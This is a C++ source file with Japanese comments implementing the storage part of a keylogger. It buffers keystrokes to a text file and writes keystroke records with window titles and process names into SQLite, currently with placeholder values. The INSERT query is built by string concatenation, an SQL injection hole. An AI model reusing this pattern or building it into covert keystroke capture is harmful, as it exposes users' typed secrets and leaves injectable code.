// KeyLogger.cpp
#include "../include/KeyLogger.hpp"

void KeyLogger::setDBFilename(PATH initpath){
    dbpath = initpath;
}

void KeyLogger::onKeyPress(std::string str) {
    keyBuffer += str + ",";
    if (keyBuffer.length() >= 2 * flushBufferSize){
        keyBuffer += "\r\n";
        flushBufferToFile();
        keyBuffer = "";
    }
}
void KeyLogger::memory(KeyLog* keylog) {
    sqlite3* db;
    char* errMsg = nullptr;

    // データベース接続（なければ作成される）
    if (sqlite3_open(dbpath.string().c_str(), &db)) {
        debug_log(LogLevel::Error, "couldn't open db file: ", sqlite3_errmsg(db));
        return;
    }

    // テーブル作成（なければ作成）
    const char* createTableSQL = R"(
        CREATE TABLE IF NOT EXISTS keylogs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            timestamp TEXT,
            key TEXT,
            modifiers TEXT,
            window_title TEXT,
            process_name TEXT
        );
    )";
    if (sqlite3_exec(db, createTableSQL, nullptr, nullptr, &errMsg) != SQLITE_OK) {
        debug_log(LogLevel::Error, "couldn't create a table ", errMsg);
        sqlite3_free(errMsg);
    }

    std::ostringstream oss;
    std::ostringstream osss;

    // 仮のログデータを挿入（本来はキー入力処理から取得）
    // std::string timestamp = "2025-05-22 12:34:56";
    tm time = keylog->local_time;
    oss << launchCounter << "_" << 1900 + time.tm_year << 1 + time.tm_mon << time.tm_mday;
    osss << 1900 + time.tm_year << "-" << 1 + time.tm_mon << "-" << time.tm_mday<< " " 
    << time.tm_hour << ":" << time.tm_min << ":" << time.tm_sec ;

    std::string session_id = oss.str().c_str();
    std::string timestamp = osss.str().c_str();
    std::string key = "A";
    std::string modifiers = "Shift";
    std::string window_title = "メモ帳";
    std::string process_name = "notepad.exe";

    std::string insertSQL = "INSERT INTO keylogs (session_id, timestamp, key, modifiers, window_title, process_name) VALUES ('" +
        session_id + "', '" + timestamp + "', '" + key + "', '" + modifiers + "', '" + window_title + "', '" + process_name + "');";

    if (sqlite3_exec(db, insertSQL.c_str(), nullptr, nullptr, &errMsg) != SQLITE_OK) {
        debug_log(LogLevel::Error, "Insertion Error ", errMsg);
        sqlite3_free(errMsg);
    } else {
        debug_log(LogLevel::Info, "Save Success");
    }

    sqlite3_close(db);
    debug_log(LogLevel::Info, "close");
    return;
}
void KeyLogger::flushBufferToFile(){
    debug_log(LogLevel::Info, "flush: ", keyBuffer);
    std::ofstream file;
    file.open(logfilepath, std::ios::app);  // 追記モード
    if (!file.is_open()) {
        debug_log(LogLevel::Info, "couldn't open file");
    }
    file << keyBuffer;
    file.close();
}
void KeyLogger::setLaunchCounter(int lcounter){
    launchCounter = lcounter;
}